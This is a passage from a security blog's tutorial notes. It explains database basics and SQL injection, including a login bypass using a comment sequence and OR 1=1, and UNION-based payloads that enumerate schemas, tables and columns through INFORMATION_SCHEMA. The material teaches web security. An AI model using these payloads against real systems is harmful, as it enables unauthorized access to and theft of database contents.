highlighter-rouge">tables</code> of the database. It can be seen as an array containing different data. Each one has an id, a name and a surname those are the <code class="language-plaintext highlighter-rouge">attributes</code> ot the tables. <code class="language-plaintext highlighter-rouge">ID</code> is usually used to differentiate two <code class="language-plaintext highlighter-rouge">entry</code> of a table. We could have a student and a professor that have the same name and the same surname. If this happens and we don’t have an <code class="language-plaintext highlighter-rouge">ID</code> how can we differentiate them ? For each <code class="language-plaintext highlighter-rouge">entry</code>, we have several <code class="language-plaintext highlighter-rouge">value</code>. For the first professor, the <code class="language-plaintext highlighter-rouge">value</code> for the id is <code class="language-plaintext highlighter-rouge">1</code>, for the name it’s <code class="language-plaintext highlighter-rouge">name1</code> and for the surname it’s <code class="language-plaintext highlighter-rouge">sur1</code>. As I said, ID need to be different to differentiate two students or two professors but I’m talking about ID of a certain <code class="language-plaintext highlighter-rouge">table</code>. Of course <code class="language-plaintext highlighter-rouge">we can have a student with the same ID as a professor</code> because they are not in the same table.</p><h3 id="basic-sql-commands"><span class="mr-2">Basic SQL Commands</span><a href="#basic-sql-commands" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Now that you have a better understanding of a database, we can look on how to recover that data. The most common way is to recover all entries of a table :</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">STUDENT</span><span class="p">;</span>
</pre></table></code></div></div><p>If we want to look for specific attributes, we can do :</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="n">name</span><span class="p">,</span> <span class="n">surname</span> <span class="k">FROM</span> <span class="n">STUDENT</span><span class="p">;</span>
</pre></table></code></div></div><p>Here we don’t have much student but if we had hundred of them, we could display all students that have an id greater than 50 like this :</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="n">name</span><span class="p">,</span> <span class="n">surname</span> <span class="k">FROM</span> <span class="n">STUDENT</span> <span class="k">WHERE</span> <span class="n">id</span> <span class="o">&gt;</span> <span class="mi">50</span> <span class="p">;</span>
</pre></table></code></div></div><p>As I said previously, we are not going in depth into SQL and it’s query so you may want to look at some online courses about the SQL language and its queries.</p><blockquote class="prompt-note"><div><p>Note that SQL queries isn’t case sensitive. It means that you can write <code class="language-plaintext highlighter-rouge">SELECT</code> or <code class="language-plaintext highlighter-rouge">select</code>.</p></div></blockquote><h3 id="common-sqli"><span class="mr-2">Common SQLi</span><a href="#common-sqli" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The most common SQLi is in connection forms. You are asked to give a username and password. If I enter my credentials, the query may look like the following one and if there is no entry returned, it means that I gave a wrong password and/or a wrong user.</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">usertable</span> <span class="k">WHERE</span> <span class="n">profileID</span><span class="o">=</span><span class="s1">'batbato'</span> <span class="k">AND</span> <span class="n">password</span> <span class="o">=</span> <span class="s1">'batbato'</span>
</pre></table></code></div></div><p>But what happens if I put as a user an apostrophe (<code class="language-plaintext highlighter-rouge">'</code>) ? The query will look like :</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">usertable</span> <span class="k">WHERE</span> <span class="n">profileID</span><span class="o">=</span><span class="s1">'</span><span class="se">''</span><span class="s1"> AND password = '</span><span class="n">batbato</span><span class="s1">'
</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>Note that inputting an apostrophe (<code class="language-plaintext highlighter-rouge">'</code>) or a quote (<code class="language-plaintext highlighter-rouge">"</code>) can print an error message if the debugger mode has not been disabled.</p></div></blockquote><p>This will result in an error. But we can comment on the rest of the command so that the command will only look for the username. Comments can be <code class="language-plaintext highlighter-rouge">-- -COMMENT</code> or <code class="language-plaintext highlighter-rouge">#COMMENT</code>.</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">usertable</span> <span class="k">WHERE</span> <span class="n">profileID</span><span class="o">=</span><span class="s1">'admin'</span> <span class="c1">-- -' AND password = 'batbato'</span>
</pre></table></code></div></div><p>This command where our user is <code class="language-plaintext highlighter-rouge">admin' -- -</code> is equivalent to :</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">usertable</span> <span class="k">WHERE</span> <span class="n">profileID</span><span class="o">=</span><span class="s1">'admin'</span>
</pre></table></code></div></div><p>But what if the admin username isn’t “admin” ? We can use the well-known payload <code class="language-plaintext highlighter-rouge">OR 1=1</code> (equivalent to <code class="language-plaintext highlighter-rouge">OR True</code>) so that we get the first user :</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">usertable</span> <span class="k">WHERE</span> <span class="n">profileID</span><span class="o">=</span><span class="s1">'admin'</span> <span class="k">OR</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="c1">-- -' AND password = 'batbato'</span>
</pre></table></code></div></div><blockquote class="prompt-warning"><div><p>Note that the apostrophe is important ! If the <code class="language-plaintext highlighter-rouge">profileID</code> is a decimal, it may not require an apostrophe and if the query use quote (<code class="language-plaintext highlighter-rouge">"</code>) then your payload should contain quotes instead of apostrophes.</p></div></blockquote><h3 id="union"><span class="mr-2">UNION</span><a href="#union" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>In SQL, we can use the <code class="language-plaintext highlighter-rouge">UNION</code> to combine the result-set of two or more <code class="language-plaintext highlighter-rouge">SELECT</code> statements. ex:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="k">column_name</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">table1</span>
<span class="k">UNION</span>
<span class="k">SELECT</span> <span class="k">column_name</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">table2</span><span class="p">;</span> 
</pre></table></code></div></div><p>Instead of the connection form, here we are going to look at something like a search bar. First we need to look for the number of columns of the query. We will try to input :</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="s1">' UNION SELECT NULL -- -
</span></pre></table></code></div></div><p>If this doesn’t print <code class="language-plaintext highlighter-rouge">NULL</code>, we can try :</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="s1">' UNION SELECT NULL, NULL -- -
</span></pre></table></code></div></div><p>Again and again until we see the <code class="language-plaintext highlighter-rouge">NULL</code> where the result should be output. For the rest of the example we are going to assume we have two columns. We look for the name of the database with <code class="language-plaintext highlighter-rouge">schema_name</code> from the table <code class="language-plaintext highlighter-rouge">INFORMATION_SCHEMA.SCHEMATA</code>:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="s1">' UNION SELECT 1,group_concat(0x7c,schema_name,0x7c) FROM INFORMATION_SCHEMA.SCHEMATA -- -
</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>Note the use of <code class="language-plaintext highlighter-rouge">group_concat(0x7c,schema_name,0x7c)</code>. This will display all the attributes in a single cell separated by <code class="language-plaintext highlighter-rouge">|</code>. If there is not enough space to show all the attributes, we can show them all at once with <code class="language-plaintext highlighter-rouge">group_concat()</code>.</p></div></blockquote><p>We obtain all the databases names. Imagine we found the database <code class="language-plaintext highlighter-rouge">SCHOOL</code> from the previous example. We look for the tables it contains :</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="s1">' UNION SELECT group_concat(0x7c,TABLE_NAME,0x7c),group_concat(0x7c,TABLE_SCHEMA,0x7c) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='</span><span class="n">SCHOOL</span><span class="s1">' -- -
</span></pre></table></code></div></div><p>If we want to have a look at the <code class="language-plaintext highlighter-rouge">Student</code> table, we can list the names of the columns like that :</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="s1">' UNION SELECT group_concat(0x7c,COLUMN_NAME,0x7c),group_concat(0x7c,TABLE_NAME,0x7c) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='</span><span class="n">Student</span><span class="s1">' -- -
</span></pre></table></code></div></div><p>We get the name and the surname with :</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="s1">' UNION SELECT group_concat(0x7c,name,0x7c),group_concat(0x7c,surname,0x7c) FROM Student -- -
</span></pre></table></code></div></div><p>If there are some protections, you can try to bypass them by encoding your queries, changing the case… This <a href="https://portswigger.net/support/sql-injection-bypassing-common-filters">PortSwigger article</a> can explain it to you.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/notes/'>Notes</a>, <a href='/categories/web/'>Web</a>, <a href='/categories/common-web-attacks/'>Common Web Attacks</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/web/" class="post-tag no-text-decoration" >Web</a> <a href="/tags/common-web-attacks/" class="post-tag no-text-decoration" >Common Web Attacks</a> <a href="/tags/xss/" class="post-tag no-text-decoration" >XSS</a> <a href="/tags/xxe/" class="post-tag no-text-decoration" >XXE</a> <a href="/tags/idor/" class="post-tag no-text-decoration" >IDOR</a> <a href="/tags/sqli/" class="post-tag no-text-decoration" >SQLi</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Notes+%7C+Common+Web+Attacks+-+BatBato%27s+Blog&url=nouman404.github.io%2FNotes%2FWeb%2FCommon_Web_Attacks" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Notes+%7C+Common+Web+Attacks+-+BatBato%27s+Blog&u=nouman404.github.io%2FNotes%2FWeb%2FCommon_Web_Attacks" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=nouman404.github.io%2FNotes%2FWeb%2FCommon_Web_Attacks&text=Notes+%7C+Common+Web+Attacks+-+BatBato%27s+Blog" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/Notes/AD/AD_Basics">Notes | AD | AD Basics</a><li><a href="/Notes/AD/Tools">Notes | AD | AD Tools</a><li><a href="/CTFs/HeroCTF_2024/Steganographie/Zipper">CTFs | HeroCTF_2024 | Steganographie | Zipper</a><li><a href="/CTFs/HeroCTF_2024/Forensique/LazySysAdmin2">CTFs | HeroCTF_2024 | Forensique | LazySysAdmin2</a><li><a href="/CTFs/HeroCTF_2024/Forensique/Tenant_trouble">CTFs | HeroCTF_2024 | Forensique | Tenant trouble</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/forensique/">Forensique</a> <a class="post-tag" href="/tags/404ctf/">404CTF</a> <a class="post-tag" href="/tags/stegano/">Stegano</a> <a class="post-tag" href="/tags/fcsc/">FCSC</a> <a class="post-tag" href="/tags/forensic/">Forensic</a> <a class="post-tag" href="/tags/osint/">OSINT</a> <a class="post-tag" href="/tags/stega/">Stega</a> <a class="post-tag" href="/tags/reverse/">Reverse</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/CTFs/404CTF_2023/Web/La_Vie_Fran%C3%A7aise"><div class="card-body"> <em class="small" data-ts="1685916000" data-df="ll" > Jun 5, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CTFs | 404CTF_2023 | Web | La Vie Française</h3><div class="text-muted small"><p> La Vie Française When we arrive in this challenge, we access a web page where we can create an account by clicking on Postuler: Because I am someone really original, I created the user a with...</p></div></div></a></div><div class="card"> <a href="/CTFs/DGHACK_2023/Web/Plugin_Again"><div class="card-body"> <em class="small" data-ts="1701298800" data-df="ll" > Nov 30, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CTFs | DGHACK_2023 | Web | Plugin Again</h3><div class="text-muted small"><p> Plugin Again As written in the description of the challenge, we need to read the content of the /FLAG file. We only have access to a URL so we can navigate to the website and we get this: Fir...</p></div></div></a></div><div class="card"> <a href="/Notes/Web/Command_Injection"><div class="card-body"> <em class="small" data-ts="1661378400" data-df="ll" > Aug 25, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Notes | Command Injection</h3><div class="text-muted small"><p> Command Injection A command injection occurs when a user input is not sanitised. A basic example can be a ping command. If a user can enter the IP of the machine and the IP is not sanitised, we co...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/Notes/Privilege_Escalation/Windows_PE" class="btn btn-outline-primary" prompt="Older"><p>Notes | Windows Privilege Escalation</p></a> <a href="/CTFs/404CTF/" class="btn btn-outline-primary" prompt="Newer"><p>CTFs | 404CTF</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/Nouman404/">Bat</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/forensique/">Forensique</a> <a class="post-tag" href="/tags/404ctf/">404CTF</a> <a class="post-tag" href="/tags/stegano/">Stegano</a> <a class="post-tag" href="/tags/fcsc/">FCSC</a> <a class="post-tag" href="/tags/forensic/">Forensic</a> <a class="post-tag" href="/tags/osint/">OSINT</a> <a class="post-tag" href="/tags/stega/">Stega</a> <a class="post-tag" href="/tags/reverse/">Reverse</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
